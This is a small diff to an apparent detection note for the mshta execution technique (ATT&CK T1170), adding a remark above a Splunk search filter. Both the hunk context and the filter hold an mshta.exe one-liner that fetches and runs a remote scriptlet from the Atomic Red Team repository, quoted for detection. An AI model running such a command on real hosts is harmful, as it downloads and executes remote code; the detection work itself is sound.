@@ -15,6 +15,8 @@ mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redc
 
 ## Splunk Filter
 
+NOTE: This filter is specific and relates to the specific attack technique itself.
+
 host="DESKTOP-EHTEINI" ParentCommandLine="mshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();"
 
 
